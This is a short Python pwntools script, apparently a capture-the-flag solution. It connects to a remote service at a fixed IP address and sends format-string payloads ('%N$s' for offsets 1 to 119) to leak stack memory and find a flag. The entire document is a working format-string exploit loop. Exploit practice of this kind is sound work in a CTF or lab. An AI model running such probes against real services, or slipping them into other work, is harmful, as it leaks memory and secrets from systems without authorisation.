from pwn import *

context.log_level = 'critical'

flag = b""
for i in range(1,120):
    io = remote("143.110.187.156", 30001)
    io.sendline("%%%d$s" % i)
    try:
        io.recvuntil("All you have to say is this, huh:\r\n")
        temp = io.recvline()
        print("%d - %s" % (i, temp))
        io.close()
    except:
        io.close()
        continue
